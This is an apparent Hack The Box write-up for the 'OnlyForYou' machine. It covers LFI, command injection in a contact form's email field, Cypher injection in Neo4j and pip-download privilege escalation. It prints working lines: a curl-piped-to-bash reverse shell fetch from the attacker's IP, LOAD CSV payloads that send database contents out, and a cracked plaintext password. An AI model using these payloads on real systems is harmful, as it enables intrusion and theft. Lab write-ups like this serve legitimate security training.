# OnlyForYou Machine Writeup

<img src="/assets/images/hackthebox/OnlyForYou.png" alt="OnlyForYou" style="zoom:50%;" />

OnlyForYou is a medium Linux machine that includes LFI exploitation, code execution, cypher injection in `neo4j` database, and source code review.

## Recon

First, let’s start with nmap port scanning.

![nmap](/assets/images/hackthebox/nmap.png)

We can see that port 80 is open, so let's check it.

![only4you](/assets/images/hackthebox/only4you.png)

We can't find anything interesting, so let's do subdomain enumeration.

![wfuzz](/assets/images/hackthebox/wfuzz.png)

We can see `beta.only4you.htb` subdomain, so let's check it.

![](/assets/images/hackthebox/beta-page.png)

## LFI

We can see that we have source code, so let's download and unzip it.

![beta-source-code](/assets/images/hackthebox/beta-source-code.png)

If we check `app.py`, the `/download` route looks interesting.

![bet-app](/assets/images/hackthebox/bet-app.png)

It sends a post request with `image` parameter that contains the image's filename.

If the filename contains `..` and `../`, it redirects the user to `/list`.

So If we navigate to `/list` and click any button, it redirects to `/download`.



![beta-list](/assets/images/hackthebox/beta-list.png)

Let's intercept the request to Burp and play with `image` parameter.

![beta-download](/assets/images/hackthebox/beta-download.png)

We can use `/etc/passwd` to bypass `..` filter and it shows the following result:

![passwd](/assets/images/hackthebox/passwd.png)

As we know the running server is `nginx`, we can try to read `nginx.conf`.

![nginx-conf](/assets/images/hackthebox/nginx-conf.png)

We can see that we have `/etc/nginx/sites-enabled/` let's read the `/default`.

![nginx-default](/assets/images/hackthebox/nginx-default.png)

We have `app.py` in beta folder, so let's read `app.py` using `/var/www/only4you/app.py`.

![only4you-app](/assets/images/hackthebox/only4you-app.png)

We can see above that the code imports the `form` library which is not a python built-in library, so a file with the library name `form.py` must be found on the server. Let's read it.

![only4you-form](/assets/images/hackthebox/only4you-form.png)

## Command injection

As we can see the domain of the `email` parameter is appended to the `dig` command line, and so it indicates a command injection vulnerability.

So let's first fill out the form of `contact` and intercept the request in Burp.

![only4you-contact](/assets/images/hackthebox/only4you-contact.png)

Now let's try to test the `email` parameter with `test@test.com|ping 10.10.x.x`.

![command-injection-test-1](/assets/images/hackthebox/command-injection-test-1.png)

It responds to our listener which means that the code is vulnerable to command injection.

![command-injection-test-2](/assets/images/hackthebox/command-injection-test-2.png)

Now let's try to get a reverse shell but If we inject the shell directly in the `email` parameter it won't work, so we can first create a file with our shell:

![revshel-payload](/assets/images/hackthebox/revshel-payload.png)

The we can call it using `test@test.com|curl http://10.10.16.47/revshell.sh|bash`.

![revshell-payload](/assets/images/hackthebox/revshell-payload.png)

Now we get a reverse shell as seen below.

![revshell](/assets/images/hackthebox/revshell.png)

## Shell as john

When we check the machine manually, we can find the following open ports.

![netstat](/assets/images/hackthebox/netstat.png)

Ports `3000`, `8001` look interesting, so let's forward these ports to our machine using [chisel](https://github.com/clcarwin/chisel-TCP-over-HTTP) so we can check the services running on them.

>  Chisel is a fast TCP tunnel, transported over HTTP. A single executable including both client and server. Written in Golang. Chisel is mainly useful for passing through firewalls.

Setting up a chisel listener on our machine:

![chisel-server](/assets/images/hackthebox/chisel-server.png)

Forwarding the required ports on the server machine:

![chisel-client](/assets/images/hackthebox/chisel-client.png)

Now we check if there's a web service running on port `3000` by going to the following URL in our browser "127.0.0.1:3000".

As we can see the web service running in port `3000` is `Gogs`.

![gogs-3000](/assets/images/hackthebox/gogs-3000.png)

Checking port `8001`, we can see a login page but we don't have any login credentials.

![port-8001-login](/assets/images/hackthebox/port-8001-login.png)

If we try `admin:admin` we will be navigated to the admin dashboard.

![port-8001](/assets/images/hackthebox/port-8001.png)

We can see a `neo4j` database.

> Neo4j is a graph database management system developed by Neo4j, Inc. The data elements Neo4j stores are nodes, edges connecting them, and attributes of nodes and edges.

so let's try to inject different payloads in the `search` parameter to retrieve data using [hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j).

![search-func](/assets/images/hackthebox/search-func.png)

Note that the payloads first need to be URL encoded before sending it.

Payload #1 (extract database version):

`' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.47:80/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // `.

![neo4j-version-burp](/assets/images/hackthebox/neo4j-version-burp.png)

We can setup a simple HTTP server using python to receive the payload response.

![neo4j-version](/assets/images/hackthebox/neo4j-version.png)

Payload #2 (extract labels aka tables):

``'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.47:80/?label='+label as l RETURN 0 as _0 //`.

![neo4j-tables-burp](/assets/images/hackthebox/neo4j-tables-burp.png)

![neo4j-tables](/assets/images/hackthebox/neo4j-tables.png)

Payload #2 (extract properties of user label):

`' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.47:80/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //`.

![neo4j-creds-burp](/assets/images/hackthebox/neo4j-creds-burp.png)

![neo4j-creds](/assets/images/hackthebox/neo4j-creds.png)

We can see hashed password for the user `john`. We can crack it using [crackstation](https://crackstation.net/).

![crackstation](/assets/images/hackthebox/crackstation.png)

Now we can login using SSH as `john:ThisIs4You` and read `user.txt`.

![user-flag](/assets/images/hackthebox/user-flag.png)

## Shell as root

Let's check the sudo permissions allowed to our user `john`.

![sudo-priv](/assets/images/hackthebox/sudo-priv.png)

As seen above, we can download `.tar.gz` files from `Gogs` using `pip3` without root privileges.

> `pip download` does the same downloading as `pip install`, but instead of installing the dependencies, it collects the downloaded distributions into the directory provided (defaulting to the current directory).

From the previous image we can see that the download privileges are affecting the `Gogs` web service running on port `3000`. Let's try to `john`'s login credentials `john:ThisIs4You` in the sign in page of the `Gogs` website.

As seen below, we have access to a git workspace, so we can upload `.tar.gz` files there.

![gogs-dashboard](/assets/images/hackthebox/gogs-dashboard.png)

Now if we search for `pip3 download` exploit, we will find that `pip download` vulnerable to [code execution](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/).

First, we need to download [this repository](https://github.com/wunderwuzzi23/this_is_fine_wuzzi) and edit `setup.py` file to execute our commands from `RunCommand` function.

The only command we are using is `chmod` to change the `suid` of `bash` file.;

![root-exploit](/assets/images/hackthebox/root-exploit.png)

Then, we need to run `python3 -m build` to generate `.tar.gz` file.

![python3-build](/assets/images/hackthebox/python3-build.png)

Now we should create a new repository on `Gogs`.

![root-repo](/assets/images/hackthebox/root-repo.png)

![root-repo-commands](/assets/images/hackthebox/root-repo-commands.png)

Finally, we can push our `.tar.gz` file to the newly created repository.

![root-priv-2](/assets/images/hackthebox/root-priv-2.png)

Now we have our file in `root` repository we just created.

![root-repo-2](/assets/images/hackthebox/root-repo-2.png)

Let's download the tar file using pip3 which will in turn unzip and run the `setup.py` file.

![root-priv-1](/assets/images/hackthebox/root-priv-1.png)

Now Let's run `/bin/bash` and use the `-p` option to run it in privileged mode to be able to read `root.txt`.

![root-flag](root-flag.png)